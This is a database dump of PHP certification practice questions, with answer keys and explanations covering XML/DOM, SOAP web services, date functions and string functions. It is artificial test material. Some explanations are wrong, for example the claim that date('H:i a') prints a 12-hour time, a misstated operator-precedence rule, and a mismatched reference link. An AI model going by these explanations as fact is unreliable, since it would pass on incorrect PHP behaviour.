	(175,5,'Which of the following is used to retriev.....om a SimpleXMLElement object?','','<p><span>Which of the following is used to retrieve the namespaces declared in an XML document from a SimpleXMLElement object?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><br /><span>The getDocNamespaces() function is used to retrieve the namespaces declared in an XML document from a SimpleXMLElement object. When this function successfully executes, it returns an array of the namespaces in an XML document. The syntax of the getDocNamespaces() function is as follows:</span></p>\r\n<p><span><pre>class SimpleXMLElement\r\n{\r\n   string getDocNamespaces(recursive)\r\n} </pre></span></p>\r\n<p><span><span>where&nbsp;</span><uc:hed>recursive</uc:hed><span>&nbsp;is an optional parameter. If it is specified, it returns all namespaces used in parent and child nodes. Otherwise, it returns only namespaces used in the root node. By default, it is set to false.</span></span></p>',0,'2012-11-24 12:52:42','2012-11-24 12:52:42'),
	(176,5,'You have given the following XML data in .....pt is executed?','','<p><span>You have given the following XML data in the tasks.XML file:</span></p>\r\n<p><span><pre><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n<tasklist>\r\n      <note>\r\n         <tasks>Validate data</tasks>\r\n         <details>String Validation</details>\r\n      </note>\r\n      <note>\r\n         <tasks>Secure data</tasks>\r\n         <details>Encryption</details>\r\n      </note>\r\n</tasklist> </pre></span></p>\r\n<p><span><span>Now, you run the following PHP script:</span></span></p>\r\n<p><span><span><pre><?php\r\n  $objDOM = new DOMDocument();\r\n  $objDOM->load(\"tasks.xml\"); \r\n  $note = $objDOM->getElementsByTagName(\"note\");\r\n  foreach( $note as $value )\r\n  {\r\n       $tasks = $value->getElementsByTagName(\"tasks\");\r\n       $task  = $tasks->item(0)->nodeValue;\r\n       $details = $value->getElementsByTagName(\"details\");\r\n       $detail  = $details->item(0)->nodeValue;\r\n       echo \"$task :: $detail <br>\";\r\n  }\r\n?> </pre></span></span></p>\r\n<p><span><span><span>What should be displayed when this script is executed?</span></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The PHP script will print the contents of every tasks and details nodes. The detailed explanation of the PHP script is as follows:</span></p>\r\n<p><span><pre><?\r\n  $objDOM = new DOMDocument();\r\n  $objDOM->load(\"tasks.xml\"); //Loads the XML data into DOM object\r\n  $note = $objDOM->getElementsByTagName(\"note\"); // Gets elements by <note>\r\n  // for each note tag, parse the document and get values for tasks and details tag.\r\n  foreach( $note as $value )\r\n  {\r\n       $tasks = $value->getElementsByTagName(\"tasks\");\r\n       $task  = $tasks->item(0)->nodeValue; // nodeValue is the value of this node.\r\n       $details = $value->getElementsByTagName(\"details\");\r\n       $detail  = $details->item(0)->nodeValue;\r\n       echo \"$task :: $detail <br>\";\r\n  }\r\n?>  </pre></span></p>',0,'2012-11-24 12:55:03','2012-11-24 12:55:03'),
	(177,5,'What will be the output of the following .....>\r\n','','<p><span>What will be the output of the following PHP script?</span></p>\r\n<p><span><pre><?php\r\n$dom = new DOMDocument();\r\n$dom->load(\'book.xml\');\r\n \r\n$a = $dom->document_element();\r\nprint_r($a);\r\n?> </pre></span></p>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>The dom-&gt;document_element() function is used to retrieve the root element from an XML file. For example, consider a user runs the following script:</span></p>\r\n<p><span><pre><?php\r\n$dom = new DOMDocument();\r\n$dom->load(\'book.xml\');\r\n \r\n$a = $dom->document_element();\r\nprint_r($a);\r\n?> </pre></span></p>',0,'2012-11-24 13:14:31','2012-11-24 13:14:31'),
	(178,5,'Given a table created as shown below:','','<p><span>Given a table created as shown below:</span></p>\r\n<p><span><pre>create table foo (c1 int, c2 int, c3 int, c4 char(10)) </pre></span></p>\r\n<p><span><span>If column c1 has a cardinality of 10, column c2 has a cardinality of 5000, and column c3 has a cardinality of 5000000, which of the following indexes would optimize the following statement?</span></span></p>\r\n<p><span><span><pre>Select c1,c2,c3 from foo where c1=100 and c2= 100 and c3 = 100</pre></span></span></p>\r\n<p><span><span><br /></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.&nbsp;</span><br /><br /><span>It is important to create indexes by columns ordered on most frequently used columns in joins first and highest cardinality columns first. In this case the query is not a join, so if we base the order of the columns in the index on cardinality, we would want to create the index as (c3,c2,c1).&nbsp;</span><br /><br /><span>Since the cardinality of c3 is so much higher than the other two columns, the order of those two remaining columns is not as vital, so if we created the index as (c3,c1,c2), there would not be much difference in performance, but the order (c3,c2,c1) is the optimal query.</span></p>\r\n<p><span><span>In SQL (Structured Query Language), the term cardinality refers to the uniqueness of data values contained in a particular column (attribute) of a database table. The lower the cardinality, the more duplicated elements in a column. Thus, a column with the lowest possible cardinality would have the same value for every row. SQL databases use cardinality to help determine the optimal query plan for a given query.</span></span></p>',0,'2012-11-24 13:15:54','2012-11-24 13:15:54');

INSERT INTO `questions` (`id`, `book_id`, `title`, `exerpt`, `content`, `explanation`, `checkbox_answers`, `created_at`, `updated_at`)
VALUES
	(179,5,'You run the following PHP script:','','<p><span>You run the following PHP script:</span></p>\r\n<p><span><pre><?php\r\ninclude(\"xml.inc\");\r\n \r\nif (!$dom = domxml_open_mem($xmlstr)) {\r\n  echo \"Error while parsing the XML document\\n\";\r\n  exit;\r\n}\r\n \r\n$a = **********\r\nprint_r($a);\r\n?> </pre></span></p>\r\n<p><span><span>Which of the following functions will you use instead of * if you want to print the root element of the XML file?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The dom-&gt;document_element() function is used to retrieve the root element from an XML file. For example, consider a user runs the following script:</span></p>\r\n<p><span><pre><?php\r\ninclude(\"xml.inc\");\r\n\r\nif (!$dom = domxml_open_mem($xmlstr)) {\r\necho \"Error while parsing the XML document\\n\";\r\nexit;\r\n}\r\n\r\n$a = $dom->document_element();\r\nprint_r($a);\r\n?> </pre></span></p>\r\n<p><span><span>The output will be the root element of the XML file.</span><br /><br /><span>Answer option C is incorrect. The node-&gt;parent_node() function returns the parent node.&nbsp;</span><br /><br /><span>Answer options B and D are incorrect. These are not valid DOM XML functions.</span></span></p>',0,'2012-11-24 13:17:23','2012-11-24 13:17:23'),
	(180,5,'All of the following are the advantages o.....service except for which one?','','<p><span>All of the following are the advantages of Webservice except for which one?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>There are various advantages of the Webservices, which are as follows:</span></p>\r\n<ol>\r\n<li>It provides CURL support.</li>\r\n<li>It provides OOPS support.</li>\r\n<li>It provides XML support.</li>\r\n<li>It provides potential SOAP extension.</li>\r\n<li>It provides the HTTP standard, which allows more systems to communicate with one another.</li>\r\n<li>It standardizes the messaging capability on different systems.</li>\r\n<li>It standardizes the publishing and finding of Web services.</li>\r\n<li>It standardizes the description of Web services so providers and requesters are speaking the same language.</li>\r\n</ol>',0,'2012-11-24 13:18:35','2012-11-24 13:18:35'),
	(181,5,'Which of the following are true about Web.....ng are true about Webservice?','','<p><span>Which of the following are true about Webservice?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options B, C, and D are correct.</span><br /><br /><span>Webservice is a set of loosely coupled, reusable software components that semantically encapsulate discrete functionality and are distributed and programmatically accessible over standard internet protocols. A web service is defined with a WSDL document, and other systems interact with the web service using SOAP messages, transferred using HTTP with an XML serialization. WSDL is an XML document in the http://schemas.xmlsoap.org/wsdl/ namespace for describing a web service as a set of endpoints operating on messages. It specifies the operations (methods) provided by a web service and the format of the XML messages.&nbsp;</span></p>\r\n<ol>\r\n<li>It provides CURL support.</li>\r\n<li>It provides OOPS support.</li>\r\n<li>It provides XML support.</li>\r\n<li>It provides potential SOAP extension.</li>\r\n<li>It provides the HTTP standard, which allows more systems to communicate with one another.</li>\r\n<li>It standardizes the messaging capability on different systems.</li>\r\n<li>It standardizes the publishing and finding of Web services.</li>\r\n<li>It standardizes the description of Web services so providers and requesters are speaking the same language.</li>\r\n</ol>\r\n<p><span>Answer option A is incorrect. It provides XML support.</span><br /><br /><uc:ref>Reference: PHP Manual, Contents:&nbsp;<a target=\"_blank\" href=\"http://www.ibm.com/developerworks/opensource/tutorials/os-php-webservice/\" tabindex=\"-1\">http://www.ibm.com/developerworks/opensource/tutorials/os-php-webservice/</a></uc:ref></p>',0,'2012-11-24 13:19:35','2012-11-24 13:19:35'),
	(182,5,'Which of the following protocols is norma.....normally used by Webservices?','','<p><span>Which of the following protocols is normally used by Webservices?</span></p>','<div class=\"clearfix\"><b>Explanation:</b>&nbsp;Answer option A is correct.<br /><br />Webservices uses mainly HTTP protocol. Webservice is a set of loosely coupled, reusable software components that semantically encapsulate discrete functionality and are distributed and programmatically accessible over standard internet protocols. A web service is defined with a WSDL document, and other systems interact with the web service using SOAP messages, transferred using HTTP with an XML serialization. WSDL is an XML document in the http://schemas.xmlsoap.org/wsdl/ namespace for describing a web service as a set of endpoints operating on messages. It specifies the operations (methods) provided by a web service and the format of the XML messages.<br /><br />Answer options B, C, D and E are incorrect. FTP , FTPS and SFTP are the file transfer protocols and POP3 is used for messaging.&nbsp;<br /><br /><uc:ref>Reference: PHP Manual, Contents:&nbsp;<a target=\"_blank\" href=\"http://www.ibm.com/developerworks/opensource/tutorials/os-php-webservice/\" tabindex=\"-1\">http://www.ibm.com/developerworks/opensource/tutorials/os-php-webservice/</a></uc:ref></div>',0,'2012-11-24 13:21:10','2012-11-24 13:21:10'),
	(183,5,'Which of the following is an XML protocol..... and calling of a Webservice?','','<p><span>Which of the following is an XML protocol that implements the communication between one to another machine, including the publishing, finding, binding, and calling of a Webservice?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>A Webservice is defined with a WSDL document, and other systems interact with the web service using SOAP messages, transferred using HTTP with an XML serialization. To take the advantage of the Webservice, you must have a network, the ability to do XML-based messaging, and a description of the service. The components of the Webservices are as follows:</span></p>\r\n<ul>\r\n<li><uc:hed>Network:&nbsp;</uc:hed>A network is the foundation needed to access a Web service or to make a Web service available. It should be based on HTTP protocol.</li>\r\n<li><uc:hed>XML-based messaging:&nbsp;</uc:hed>SOAP is an XML protocol that implements the communication between one to another machine, including the publishing, finding, binding, and calling of a Web service.</li>\r\n<li><uc:hed>Service description:&nbsp;</uc:hed>The service description is written in the WSDL specification. WSDL is an XML document in the http://schemas.xmlsoap.org/wsdl/ namespace for describing a web service as a set of endpoints operating on messages. It specifies the operations (methods) provided by a web service and the format of the XML messages.</li>\r\n</ul>\r\n<p><span>Answer options B, C, and D are incorrect. HTTP is used for Webservices but it is not specially designed for XML. REST is a simple way to organize interactions between independent systems. REST allows you to interact with minimal overhead with clients as diverse as mobile phones and other websites. POP3 is a messaging protocol.</span><br /><br /><uc:ref>Reference: PHP Manual, Contents:&nbsp;<a target=\"_blank\" href=\"http://www.ibm.com/developerworks/opensource/tutorials/os-php-webservice/\" tabindex=\"-1\">http://www.ibm.com/developerworks/opensource/tutorials/os-php-webservice/</a></uc:ref></p>',0,'2012-11-24 13:24:08','2012-11-24 13:24:08'),
	(184,5,'Which of the following methods are used b..... received from a SOAP server?','','<p><span>Which of the following methods are used by the SOAP client to debug messages sent to and received from a SOAP server?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>The __getLastRequestHeaders() and __getLastRequest() methods are used by the SOAP client to debug messages sent to and received from a SOAP server. These methods make possible for a developer to access the raw SOAP headers and envelope bodies.</span></p>',0,'2012-11-24 13:25:06','2012-11-24 13:25:06'),
	(185,5,'What code snippet will you use at line nu.....>\r\n','','<p><span>What code snippet will you use at line number four (4) in the code snippet given below?</span></p>\r\n<p><span><pre><?php\r\n$client = new SoapClient(\"any.wsdl\", array(\'exceptions\' => 0));\r\n$result = $client->SomeFunction();\r\nif (??????) {\r\n    trigger_error(\"SOAP Fault: (faultcode: {$result->faultcode}, faultstring: {$result->faultstring})\", E_USER_ERROR);\r\n}\r\n?></pre></span></p>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>There are two important functions in SOAP, which are as follows:</span><br /><br /></p>\r\n<ul>\r\n<li><uc:hed>is_soap_fault:&nbsp;</uc:hed>It is used to check if a SOAP call has failed.&nbsp;</li>\r\n<li><uc:hed>use_soap_error_handler:</uc:hed><span>&nbsp;It is used to set whether to use the SOAP error handler.</span></li>\r\n</ul>\r\n<div><span>The example of the is_soap_fault() function is as follows:</span></div>\r\n<div><span><pre><?php\r\n$client = new SoapClient(\"any.wsdl\", array(\'exceptions\' => 0));\r\n$result = $client->SomeFunction();\r\nif (is_soap_fault($result)) {\r\n    trigger_error(\"SOAP Fault: (faultcode: {$result->faultcode}, faultstring: {$result->faultstring})\", E_USER_ERROR);\r\n}\r\n?> </pre></span></div>',0,'2012-11-24 13:29:40','2012-11-24 13:29:40'),
	(186,5,'Which of the following is a valid SOAP cl..... is a valid SOAP client call?','','<p><span>Which of the following is a valid SOAP client call?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The SOAP extension in PHP can be used to write SOAP Servers and Clients. SOAP allows a user to build interoperable software and allows others to take advantage of software over a network. It defines rules for sending and receiving Remote Procedure Calls (RPC) such as the structure of the request and responses. Following is an example of the SOAP client call:</span></p>\r\n<p><span><pre>$client = new SoapClient(\"any.wsdl\");</pre></span></p>\r\n<p><span><span>Answer options B, C, and D are incorrect. These are not valid client calls.</span><br /><br /><uc:ref>Reference: PHP Manual, Contents:&nbsp;<a target=\"_blank\" href=\"http://www.ibm.com/developerworks/opensource/tutorials/os-php-webservice/\" tabindex=\"-1\">http://www.ibm.com/developerworks/opensource/tutorials/os-php-webservice/</a></uc:ref></span></p>',0,'2012-11-24 13:30:47','2012-11-24 13:30:47'),
	(187,5,'Which of the following protocols is used .....e speaking the same language?','','<p><span>Which of the following protocols is used to standardize the description of Web services so providers and requesters are speaking the same language?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>WSDL standardizes the description of Web services so providers and requesters are speaking the same language.</span><br /><br /><span>Answer option B is incorrect. SOAP standardizes the messaging capability on different systems.</span><br /><br /><span>Answer option C is incorrect. HTTP allows more systems to communicate with one another.</span><br /><br /><span>Answer option D is incorrect. UDDI standardizes the publishing and finding of Web services.</span></p>',0,'2012-11-24 13:33:55','2012-11-24 13:33:55'),
	(188,5,'Which of the following was not a built-in.....t-in terminology before PHP5?','','<p><span>Which of the following was not a built-in terminology before PHP5?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>SOAP was introduced in PHP5. The SOAP extension in PHP can be used to write SOAP Servers and Clients. SOAP allows a user to build interoperable software and allows others to take advantage of software over a network. It defines rules for sending and receiving Remote Procedure Calls (RPC) such as the structure of the request and responses.&nbsp;</span><br /><br /><span>Answer options B, C, and D are incorrect. XSL, XML, and CURL were supported in the prior versions of PHP also.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.ibm.com/developerworks/opensource/tutorials/os-php-webservice/\" tabindex=\"-1\">http://www.ibm.com/developerworks/opensource/tutorials/os-php-webservice/</a></uc:ref></p>',0,'2012-11-24 13:34:46','2012-11-24 13:34:46'),
	(189,5,'Which of the following functions will out..... time in the 08:26 am format?','','<p><span>Which of the following functions will output the current time in the 08:26 am format?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>You can use print date(\'H:i a\'); or print strftime(\'%I:%M %p\'); command syntaxes to print the current time in the 08:26 am format. The strftime() function is used to format the local time/date according to the local settings. The syntax of the strftime function is as follows:</span></p>\r\n<p><span><pre>string strftime (string $format [, int $timestamp = time() ])</pre></span></p>',0,'2012-11-24 13:37:00','2012-11-24 13:37:00'),
	(190,5,'Consider the following script:..... the operating system?','','<p><span>Consider the following script:</span></p>\r\n<p><span><pre><?php \r\n echo strtotime(\"january 1, 1901\"); \r\n?></pre></span></p>\r\n<p><span><span>What will be the output of the above PHP script if older versions of glibc are present in the operating system?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>In any operating system where older versions of glibc are present, the strtotime() function will not be able to identify dates prior to the UNIX period&nbsp;</span><b>midnight UTC on January 1, 1970</b><span>. Hence, the output of the script will be False.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/function.mktime.php\" tabindex=\"-1\">http://php.net/manual/en/function.mktime.php</a></uc:ref></p>',0,'2012-11-24 13:38:49','2012-11-24 13:38:49'),
	(191,5,'What will be the output of the following .....trtotime(\"24:00\");\r\n?> ','','<p><span>What will be the output of the following PHP code snippet?</span></p>\r\n<p><span><pre><?php\r\n echo strtotime(\"24:00\");\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The strtotime() function converts any English textual date or time into a Unix timestamp. It returns the number of seconds since January 1, 1970, 00:00:00 GMT from the given date or time.</span><br /><br /><span>From PHP 5.3, the strtotime() function has started returning the number of seconds for&nbsp;</span><uc:kwd>24:00</uc:kwd><span>&nbsp;also. Prior to this version, the value it was returning:</span></p>\r\n<p><span><pre>False</pre></span></p>\r\n<p><span>value.</span></p>',0,'2012-11-24 13:40:00','2012-11-24 13:40:00'),
	(192,6,'Consider the following script:..... the above PHP script?','','<p><span>Consider the following script:</span></p>\r\n<p><span><pre><?php\r\n     $string1 = \"ab\";\r\n     $string2 = \"cd\";\r\n     $string1 = $string1.$string2;      \r\n     $string3 = \"abc\";\r\n     $string1 .= $string3;\r\n     echo $string1;\r\n?></pre></span></p>\r\n<p><span><span>What will be the output of the above PHP script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>DOT (</span><b>.</b><span>) is a string concatenate operator that concatenates two strings. Hence, on compiling the program, it executes like this:</span></p>\r\n<p><span><pre><?php\r\n            $string1 = \"ab\";\r\n \r\n// The value of $string1 is ab\r\n \r\n            $string2 = \"cd\";\r\n \r\n//The value of $string2 is cd\r\n \r\n            $string1 =$string1.$string2;      \r\n \r\n//The value in $string1 is now abcd\r\n           $string3 = \"abc\";\r\n \r\n//The value in $string3 is abc\r\n \r\n           $string1 .= $string3;\r\n \r\n//The value in $string1 is abcdabc\r\n \r\n           echo $string1;\r\n      ?> </pre></span></p>',0,'2012-11-24 13:47:17','2012-11-24 13:47:17'),
	(193,6,'Consider the following string:.....s have you run?','','<p><span>Consider the following string:</span></p>\r\n<p><span><pre>ZeNd php</pre></span></p>\r\n<p><span><span>After running a PHP script, the above string is converted in the following format:</span></span></p>\r\n<p><span><span><pre>php dnez</pre></span></span></p>\r\n<p><span><span><span>Which of the following PHP scripts have you run?</span></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>In the given script, you are performing two actions to get the desired result, i.e., you are converting the string into lowercase and after that you are reversing the string. For this, you are using two string functions, which are as follows:</span><br /><br /></p>\r\n<ol>\r\n<li><uc:hed>strtolower():</uc:hed>&nbsp;The strtolower() function is used to convert a given string into lowercase.</li>\r\n<li><uc:hed>strrev():</uc:hed>&nbsp;The strrev() function is used to reverse a given string.</li>\r\n</ol>\r\n<p><span>Answer options B, C, and D are incorrect. stringrev() and str_to_lower() are not valid PHP string functions. The trim() function is used to remove any type of white space character, including new lines, tabs, and spaces, from both the start and end of a given string.</span></p>',0,'2012-11-24 13:48:44','2012-11-24 13:48:44'),
	(194,6,'What will be the output of the following .....>\r\n','','<p><span>What will be the output of the following code snippet?</span></p>\r\n<p><span><pre><?php\r\n  echo \'hello \' . 1 + 2 . \'34\';\r\n?> </pre></span></p>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>Since the concatenation operator has a higher precedence than the addition operator, the PHP compiler will read the expression as follows:</span></p>\r\n<p><span><pre>echo (\'hello \' . 1) + (2 . \'34\'); </pre></span></p>\r\n<p><span><span>when you will add a string and a number, PHP will interpret string as 0. Hence, PHP will calculate this expression as follows:</span><br /><br /><span>echo 0 + 234, i.e., 234. Hence, the output will be 234.</span></span></p>',0,'2012-11-24 13:50:22','2012-11-24 13:50:22'),
	(195,6,'Which of the fo.....insensitive binary algorithm?','','<p><span>W</span><span>hich of t</span><span>he following functions can be used to compare two strings using a case-insensitive binary algorithm?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The strcasecmp() string function can be used to compare two strings using a case-insensitive binary algorithm.</span><br /><br /><span>Answer option B is incorrect. The strcmp() function can be used to compare two strings using a case-sensitive binary algorithm.</span><br /><br /><span>Answer option C is incorrect. The strstr() function is used to test whether a string exists within another string. It needs a source string and a substring as an argument.</span><br /><br /><span>Answer option D is incorrect. The substr() function returns a part of a string.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/function.strcasecmp.php\" tabindex=\"-1\">http://php.net/manual/en/function.strcasecmp.php</a></uc:ref></p>',0,'2012-11-24 13:51:16','2012-11-24 13:51:16'),
	(196,6,'What will be the output of the following .....[3];\r\nprint_r($s);\r\n?> ','','<p><span>What will be the output of the following code?</span></p>\r\n<p><span><pre><?php\r\n$s = \'13149\';\r\n$s[$s[1]] = $s[1]+$s[3];\r\nprint_r($s);\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>PHP interprets strings as arrays, hence this script simply replaces the value of $s[1] with the character 3. This results as follows:</span></p>\r\n<p><span><pre>$s[3] = $s[1]+$s[3]; </pre></span></p>\r\n<p><span><span>It means $s[3] = 3 + 4, i.e., 7. Hence the output of this script will be 13179.</span></span></p>',0,'2012-11-24 13:52:30','2012-11-24 13:52:30'),
	(197,6,'Which of the following functions will you..... based on a specific pattern?','','<p><span>Which of the following functions will you use to break a string into an array based on a specific pattern?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>You can use the preg_split() and explode() functions to break a string into an array based on a specific pattern.</span></p>\r\n<p><span><br /></span></p>',0,'2012-11-24 13:53:48','2012-11-24 13:53:48'),
	(198,6,'You want to fetch the top level domain (c.....u use to accomplish the task?','','<p><span>You want to fetch the top level domain (com) from the email john@php.com. Which of the following functions will you use to accomplish the task?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The substr() function returns a part of a string. The syntax of the substr() function is as follows:</span></p>\r\n<p><span><pre>substr(string,start,length)</pre></span></p>\r\n<p><span><span>If the start is positive, the returned string will start from the initial position of the given string. If the start is negative, the returned string will start from the end of the given string. Here length is the number of characters to be returned from the string. The strpos() function tells the position of the first occurrence of a string inside another string. Since strings are accessed as zero-indexed arrays, the option will return the top level domain of the given email address by adding 1 in the strpos() function.</span><br /><br /><span>Answer option B is incorrect. The eregi() function matches the pattern in the given string and returns true if a match is found. Here, in this option, the eregi() function is matching to test whether or not the given email address is valid. However, the question is on top level domain.</span><br /><br /><span>Answer option C is incorrect. This option will return .com as an answer.</span><br /><br /><span>Answer option D is incorrect. This is not a valid eregi() syntax.</span></span></p>',0,'2012-11-24 13:57:31','2012-11-24 13:57:31'),
	(199,6,'Consider the following array:\r..... a single call?','','<p><span>Consider the following array:</span></p>\r\n<p><span><pre>$arr= array(\'apple\', \'banana\', \'cherry\');</pre></span></p>\r\n<p><span><span>You want to display this array as the following string:</span></span></p>\r\n<p><span><span><pre>apple, banana, cherry</pre></span></span></p>\r\n<p><span><span><span>Which of the following functions will you use to accomplish the task into a single call?</span></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The implode() function traverses the elements of an array and recreates a single string using an argument.</span></p>',0,'2012-11-24 13:59:05','2012-11-24 13:59:05'),
	(200,6,'Consider the following PHP script:.....nectwo?','','<p><span>Consider the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$charlist = array (\r\n\'a\' => \'one\', \r\n\'b\' => \'two\', \r\n); \r\n***************\r\n?> </pre></span></p>\r\n<p><span><span>What statement will you write at line number 6 instead of ***** to get the output&nbsp;</span><uc:hed>onectwo</uc:hed><span>?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>In the given script, the substring \'a\' is being converted into the string \'one\', and the substring \'b\' into the string \'two\'. Hence, you will use the strtr() function to accomplish the task. The strtr() function is used to translate certain string into another string. The syntax of the strtr() function is as follows:</span></p>\r\n<p><span><pre>strtr(string,from,to) \r\nstrtr(string,array)  </pre></span></p>\r\n<p><span><span>Answer option B is incorrect. You will not use the strstr() function to accomplish the task. The strstr() function is used to test whether a string exists within another string. It needs a source string and a substring as an argument. The strstr() function returns false if the substring is absent. When the strstr() function exists, the strstr() function returns the portion of the source string beginning with the substring.</span><br /><br /><span>Answer option C is incorrect. The strtok() function is used to split a given string into smaller strings. The syntax of the strtok() function is as follows:</span></span></p>\r\n<p><span><span><pre>strtok(string,split)</pre></span></span></p>\r\n<p><span><span><span>where, the string parameter specifies the string to be split and the split parameter specifies one or more characters to be split.</span><br /><br /><span>Answer option D is incorrect. The strip_tags() function is used to remove all PHP, HTML, and XML tags from a given string. The syntax of the strip_tags() function is as follows:</span></span></span></p>\r\n<p><span><span><span><pre>string strip_tags (string $str [, string $allowable_tags])</pre></span></span></span></p>\r\n<p><span><span><span><span>where the allowable_tags parameter is the list of tags specified by the strip_tags() function that will not be removed. HTML comments are always stripped no matter whether they are allowed under the allowable_tags parameter.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.php.net/manual/en/function.strtr.php\" tabindex=\"-1\">http://www.php.net/manual/en/function.strtr.php</a></uc:ref></span></span></span></p>',0,'2012-11-24 14:01:13','2012-11-24 14:01:13'),
	(201,6,'You run the following PHP script: ','','<p><span>You run the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$x = \'john\';\r\necho substr_replace ($x, \'jenny\', 0, 0);\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The substr_replace() function is used to replace a part of a string with another string. It has the following syntax:</span></p>\r\n<p><span><pre>substr_replace(string, replacement, start, length) </pre></span></p>\r\n<p><span><span>where the start option specifies where to start replacing in the string. If start is positive, the replacement will be made at the specified position in the string, and if start is negative, the replacement will be made at the specified position from the end of the string.</span><br /><br /><span>The length option specifies how many characters should be replaced. If the length option is positive, the string should be replaced, and if length is negative, it specifies how many characters should be left at the end of the string after replacing it. If length is zero, the substr_replace() function inserts the string instead of replacing it.</span><br /><br /><span>In the above script, the start parameter is zero, which means that the replacement will start from the beginning. However, here the length parameter is also zero, which means that an insertion operation will be performed instead of replacement. Hence, the string \'jenny\' will be added in the beginning of the string \'john\' and the output will be \'jennyjohn\'.</span><br /><br /><span>Answer option B is incorrect. This output will be displayed when you run the following PHP script:</span></span></p>\r\n<p><span><span><pre><?php\r\n$x = \'john\';\r\necho substr_replace ($x, \'jenny\', 0, 4);\r\n?> </pre></span></span></p>\r\n<p><span><span><span>where the string \'jenny\' will replace the string \'john\'.</span></span></span></p>',0,'2012-11-24 14:02:11','2012-11-24 14:04:02'),
	(202,6,'What will be the output of the following ..... ($string, $mask);\r\n?> ','','<p><span>What will be the output of the following code snippet?</span></p>\r\n<p><span><pre><?php\r\n$string = \'133445abcdef\';\r\n$mask = \'12345\';\r\necho strspn ($string, $mask);\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The output will be 6. The strspn() function is used to return the number of characters found in the string that contains only characters from the charlist. The syntax of the strspn() function is as follows:</span></p>\r\n<p><span><pre>strspn(string,charlist,start,length)</pre></span></p>\r\n<p><span><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://php.net/manual/en/function.strspn.php\" tabindex=\"-1\">http://php.net/manual/en/function.session-start.php</a></span></p>',0,'2012-11-24 14:05:32','2012-11-24 14:05:32'),
	(203,6,'You are running the following PHP script:.....at will be the output?','','<p><span>You are running the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$str = \'one|two|three|four\';\r\n\r\nprint_r(explode(\'|\', $str, -1));\r\n?> </pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The explode() function is a PHP string function that takes a string and splits it into separate elements of an array, using the argument provided as delimiter. Its syntax is as follows:</span></p>\r\n<p><span><pre> explode(separator,string,limit)</pre></span></p>\r\n<p><span><span>where separator specifies where to break the string, string is the string to split, limit specifies the maximum number of array elements to return. If the limit parameter is negative, the explode function returns all components except the last \"-limit\" elements.</span><br /><br /><span>Since in this question, the limit is given as -1, it will return the first three values and leave the last value.</span></span></p>',0,'2012-11-24 14:06:53','2012-11-24 14:06:53'),
	(204,6,'You want to parse the following string in..... \\t and \\n characters?','','<p><span>You want to parse the following string in PHP:</span></p>\r\n<p><span><pre>$some_string=\"Student\\tJohn\\nMichel\\tMaria\"; </pre></span></p>\r\n<p><span><span>Which of the following PHP functions will you use to parse the string according to the \\t and \\n characters?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The strtok() function is used to split a given string into smaller strings. The syntax of the strtok() function is as follows:</span></p>\r\n<p><span><pre>strtok(string,split)</pre></span></p>\r\n<p><span><span>where, the string parameter specifies the string to be split and the split parameter specifies one or more characters to be split. In this question, you want to parse the string according to the \\t and \\n characters. Hence, you will use the following code to parse the string:</span></span></p>\r\n<p><span><span><pre>strtok($some_string, \"\\t\\n\"); </pre></span></span></p>\r\n<p><span><span><span>Answer option B is incorrect. The substr() function returns a part of a string. The syntax of the substr() function is as 